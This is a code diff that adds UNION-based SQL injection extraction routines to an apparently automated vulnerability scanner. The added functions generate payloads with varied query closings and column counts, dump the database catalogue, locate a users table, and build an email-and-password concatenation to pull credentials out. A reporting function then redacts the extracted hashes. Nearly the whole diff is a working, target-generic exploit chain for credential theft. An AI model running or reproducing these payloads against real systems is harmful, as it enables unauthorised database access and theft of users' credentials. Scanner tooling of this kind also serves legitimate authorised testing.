@@ -209,6 +209,109 @@ def auth_bypass_finding(url: str, field: str, payload: str, signal: str) -> dict
     return f
 
 
+# ── UNION-based extraction: escalate a CONFIRMED injection into proof-by-data ─────
+# This is the difference between "there is an injection here" and "here is the data it
+# leaks". Deterministic and read-only (UNION SELECT only, no writes). Generic across
+# the injection CONTEXT (the closing that balances the query) and column count, and
+# generic across schema (dumps the DB's own catalogue, finds a users-like table by
+# name, reads its e-mail/secret-like columns) — nothing target-specific is hardcoded.
+UNION_MARK = "ap0lakiUX"
+# Common ways a string literal is embedded in a WHERE clause; the one that BALANCES the
+# query is discovered empirically by marker reflection. Ordered most→least common.
+UNION_CLOSINGS = ("'))", "')", "'", '"))', '")', '"', ")", "")
+
+
+def union_count_probe(value: str, closing: str, ncols: int, mark: str = UNION_MARK) -> str:
+    cols = ",".join("'%s'" % mark for _ in range(ncols))
+    return "%s%s UNION SELECT %s-- -" % (value, closing, cols)
+
+
+def union_extract_probe(value: str, closing: str, ncols: int, expr: str,
+                        mark: str = UNION_MARK) -> str:
+    # expr goes in column 1; the marker fills the rest so the injected row is locatable.
+    cols = [expr] + ["'%s'" % mark for _ in range(max(0, ncols - 1))]
+    return "%s%s UNION SELECT %s-- -" % (value, closing, ",".join(cols))
+
+
+def union_hit(body: str, mark: str = UNION_MARK) -> bool:
+    return bool(body) and mark in body
+
+
+def schema_exprs() -> list:
+    """Catalogue-dump expressions, most portable first (sqlite, then MySQL/Postgres)."""
+    return [
+        "(SELECT group_concat(sql,'~~') FROM sqlite_master WHERE type='table')",
+        "(SELECT group_concat(table_name,'~~') FROM information_schema.tables)",
+    ]
+
+
+_USERS_TABLE_RE = re.compile(
+    r'CREATE TABLE [`"\[]?(\w*(?:user|account|member|credential|login)\w*)', re.I)
+
+
+def parse_users_table(schema_body: str):
+    m = _USERS_TABLE_RE.search(schema_body or "")
+    return m.group(1) if m else None
+
+
+def parse_columns(schema_body: str, table: str) -> list:
+    m = re.search(r'CREATE TABLE [`"\[]?%s[`"\]]?\s*\((.*)' % re.escape(table),
+                  schema_body or "", re.I | re.S)
+    if not m:
+        return []
+    return re.findall(r'[`"\[]?(\w+)[`"\]]?\s+(?:INTEGER|TEXT|VARCHAR|CHAR|BLOB|REAL|NUMERIC|DATE)',
+                      m.group(1)[:2000], re.I)
+
+
+def creds_expr(table: str, cols: list):
+    """Build an email||':'||password style dump from the users table's real columns."""
+    low = [c.lower() for c in cols]
+    def pick(hints, default):
+        for i, c in enumerate(low):
+            if any(h in c for h in hints):
+                return cols[i]
+        return default
+    idc = pick(("mail", "email", "user", "login", "name"), cols[0] if cols else "email")
+    pwc = pick(("pass", "pwd", "secret", "hash", "token"), "password")
+    return "(SELECT group_concat(%s||':'||%s) FROM %s)" % (idc, pwc, table)
+
+
+_CRED_RE = re.compile(r'[\w.+-]+@[\w.-]+:[0-9a-fA-F]{16,}')
+
+
+def parse_creds(body: str) -> list:
+    return _CRED_RE.findall(body or "")
+
+
+def parse_tables(schema_body: str) -> list:
+    return re.findall(r'CREATE TABLE [`"\[]?(\w+)', schema_body or "", re.I)
+
+
+def union_finding(url: str, param: str, ncols: int, closing: str, tables: list,
+                  cred_sample: list) -> dict:
+    # Redact the extracted secrets: keep enough to prove the dump, never the full hash.
+    red = [c.split(":")[0] + ":" + (c.split(":", 1)[1][:6] + "…") for c in cred_sample[:3]]
+    tbl = ", ".join(tables[:12])
+    ev = ("UNION SELECT balanced with closing %r at %d columns.\nDB tables: %s"
+          % (closing, ncols, tbl))
+    if red:
+        ev += "\nExtracted credentials (redacted): " + " ; ".join(red)
+    f = _base(url, param, "union-extraction", "critical",
+              (f"The confirmed injection in '{param}' was escalated with a UNION SELECT that "
+               "returned attacker-chosen rows from the database — the query context was balanced "
+               f"(closing {closing!r}, {ncols} columns) and the database catalogue and a "
+               "users table were read out."),
+              ev,
+              [f"Balance the query: append {closing} then `UNION SELECT` with {ncols} columns",
+               "Read the schema from the DB catalogue (e.g. sqlite_master / information_schema)",
+               "Dump the users table's identifier + secret columns"])
+    f["impact"] = ("Full read access to the database: dump every user's credentials and all "
+                   "application data. Extracted rows are proof the injection is exploitable, not "
+                   "merely present.")
+    f["extracted_tables"] = tables[:20]
+    return f
+
+
 def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
     return _base(url, param, "time-blind", "critical",
                  (f"For '{param}', a {item['dbms']} sleep payload delayed the response to {sleep_elapsed:.1f}s vs "
